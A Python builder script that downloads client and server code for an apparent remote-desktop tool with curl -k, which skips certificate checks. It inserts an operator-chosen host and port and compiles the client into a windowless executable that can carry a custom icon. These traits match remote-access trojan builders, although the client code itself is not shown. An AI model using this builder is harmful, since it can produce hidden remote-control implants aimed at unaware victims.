import os
import time
import subprocess
import easygui
client_script = os.popen("curl -k https://raw.githubusercontent.com/HamzLDN/RemoteDesktop/main/client.py").read()
server_script = os.popen("curl -k https://raw.githubusercontent.com/HamzLDN/RemoteDesktop/main/server.py").read()
os.system("cls")
os.system("title Builder")
time.sleep(1)
os.system("cls")
s_ip = input("Enter Host For Server: ")
s_port = input("Etner Port For Server: ")
if "192.168" in s_ip:
    c_ip = s_ip
    c_port = s_port
else:
    c_ip = input("Enter Host For Client: ")
    c_port = input("Etner Port For Client: ")

main_dir = os.getcwd()
temp = os.getenv("TEMP")
os.chdir(temp)
os.system("del client.py")
os.system("del server.py")
os.system("cls")
print("Building")
with open("client.py", "w") as f:
    client_script = client_script.replace('("localhost", 443)', f'("{c_ip}", {c_port})')
    f.write(client_script)
    f.close()
with open("server.py", "w") as f:
    server_script = server_script.replace("('0.0.0.0', 443)", f"('{s_ip}', {s_port})")
    f.write(server_script)
    f.close()

icon_conf = input("EXE Icon [Y/N]: ")
if icon_conf.upper() == "Y":
    ico_path = easygui.fileopenbox(msg='Please locate the ico file',
                    title='Specify File', default="*.ico",
                    filetypes=["*.ico"])
    if ico_path == None:
        ico_path = "NONE"
else:
    ico_path = "NONE"


print("Building EXE")
subprocess.run(f"pyinstaller --onefile --noconsole --icon={ico_path} --distpath . client.py", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
os.system(f"move client.exe {main_dir}")
os.system(f"move server.py {main_dir}")

print("Build Finished\n")
print(f"Server Located At: {main_dir}\\server.py")
print(f"Client Located At: {main_dir}\\client.exe\n")
input("Press Enter To Continue...")
